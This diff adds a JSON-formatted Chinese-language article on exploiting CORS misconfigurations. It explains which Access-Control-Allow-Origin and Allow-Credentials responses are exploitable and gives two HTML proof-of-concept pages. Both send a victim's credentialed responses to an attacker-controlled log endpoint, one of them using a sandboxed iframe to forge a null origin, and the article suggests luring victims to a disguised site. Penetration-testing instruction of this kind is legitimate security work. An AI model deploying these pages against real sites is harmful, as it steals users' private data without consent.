@@ -1,0 +1,98 @@
+{
+  "format": "blocks",
+  "no": "005",
+  "category": "网络安全",
+  "title": "CORS跨域资源共享",
+  "date": "2026-06-30",
+  "readingMinutes": 4,
+  "words": 1408,
+  "excerpt": "网站未对请求来源做限制，允许来自自身网站外的域名请求相关后端接口，并能返回数据，这存在信息泄露风险",
+  "body": [
+    {
+      "type": "p",
+      "text": "网站未对请求来源做限制，允许来自自身网站外的域名请求相关后端接口，并能返回数据，这存在信息泄露风险"
+    },
+    {
+      "type": "h2",
+      "text": "利用条件"
+    },
+    {
+      "type": "list",
+      "ordered": true,
+      "items": [
+        {
+          "text": "某个请求会返回敏感信息",
+          "level": 0
+        },
+        {
+          "text": "在请求头添加其他域名头信息，重放请求，回显满足要求",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "p",
+      "text": "*返回头信息为下面几种情况时，存在不同程度的威胁：*\n假设在请求头中添加:Origin: www.example.com"
+    },
+    {
+      "type": "quote",
+      "text": "这标识了请求来源，手动添加这一信息是为了构造来自目标网站资源域以外的请求"
+    },
+    {
+      "type": "p",
+      "text": "`Access-Control-Allow-Origin:www.example.com`\n`Access-Control-Allow-Credentials:true`\n假如返回了上面的信息，说明网站存在漏洞，且极容易利用"
+    },
+    {
+      "type": "p",
+      "text": "`Access-Control-Allow-Origin:null`\n`Access-Control-Allow-Credentials:true`\n如果返回了上面的信息，也可以认为存在漏洞，只是利用起来较难"
+    },
+    {
+      "type": "p",
+      "text": "`Access-Control-Allow-Origin:Null`\n`Access-Control-Allow-Credentials:true`\n如果返回了上面的信息，则不存在漏洞，只有返回null时可以利用"
+    },
+    {
+      "type": "p",
+      "text": "`Access-Control-Allow-Origin:*`\n`Access-Control-Allow-Credentials:true`\n如果返回了上面的信息，则无法利用，但是在写安全报告的时候可以作为配置错误问题提交"
+    },
+    {
+      "type": "h2",
+      "text": "请求poc构造"
+    },
+    {
+      "type": "code",
+      "lang": "html",
+      "text": "<html>\n  <!-- CORS PoC - 当返回Origin为源站时的poc -->\n  <body>\n    <h1>CORS poc</h1>\n\n    <script>\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','目标服务器请求地址',true);\n    req.withCredentials = true;\n    req.send();\n\n    function reqListener() {\n        location='/log?key='+this.responseText;\n    };\n    </script>\n\n  </body>\n</html>\n"
+    },
+    {
+      "type": "p",
+      "text": "用上面的payload构造伪装网站，诱使受害者点击访问，则可以收到服务器返回的受害者信息"
+    },
+    {
+      "type": "code",
+      "lang": "html",
+      "text": "<html>\n  <!-- CORS PoC - 当返回Origin为'null'时的poc,差异是包一层iframe即可发出origin为null的请求 -->\n  <body>\n    <h1>CORS poc</h1>\n\n<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','目标服务器请求地址',true);\n    req.withCredentials = true;\n    req.send();\n    function reqListener() {\n        location='控制服务器地址/log?key='+encodeURIComponent(this.responseText);\n    };\n</script>\"></iframe>\n\n  </body>\n</html>"
+    },
+    {
+      "type": "h2",
+      "text": "利用步骤"
+    },
+    {
+      "type": "list",
+      "ordered": true,
+      "items": [
+        {
+          "text": "使用正常网站登录，查找会返回敏感信息的位置",
+          "level": 0
+        },
+        {
+          "text": "找到后构造origin请求头测试是否存在cors漏洞",
+          "level": 0
+        },
+        {
+          "text": "构造poc尝试利用",
+          "level": 0
+        }
+      ]
+    }
+  ]
+}
